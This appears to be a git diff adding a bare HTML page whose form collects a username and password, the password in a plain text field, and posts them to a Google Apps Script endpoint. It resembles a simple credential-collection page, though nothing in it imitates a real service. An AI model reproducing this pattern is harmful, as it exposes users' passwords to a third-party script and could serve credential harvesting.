@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script> let scriptURL = "https://script.google.com/macros/s/AKfycbzEvh7Q3AoyG4Bvxobe65GWA4Z24msKsfSpzf6qsyad4FDUSuOsMYrbmvJzbvv7pxVEsA/exec" 
+        let form = document.forms['orderform']
+         form.addEventListener('submit',(e) => 
+         { e.preventDefault()
+             fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+             .then(response => alert("Thank you! your form is submitted successfully." )) 
+             .then(() => { window.location.reload(); })
+              .catch(error => console.error('Error!', error.message)) })
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div>
+            <form name="orderform" action="https://script.google.com/macros/s/AKfycbzEvh7Q3AoyG4Bvxobe65GWA4Z24msKsfSpzf6qsyad4FDUSuOsMYrbmvJzbvv7pxVEsA/exec" method="post">
+                <input type="text" placeholder="Username" name="Username" id="Username">
+                <input type="text" placeholder="Password" name="Password" id="Password">
+                <button type="submit">SUBMIT</button>
+            </form>
+
+        </div>
+
+    </div>
+</body>
+</html>
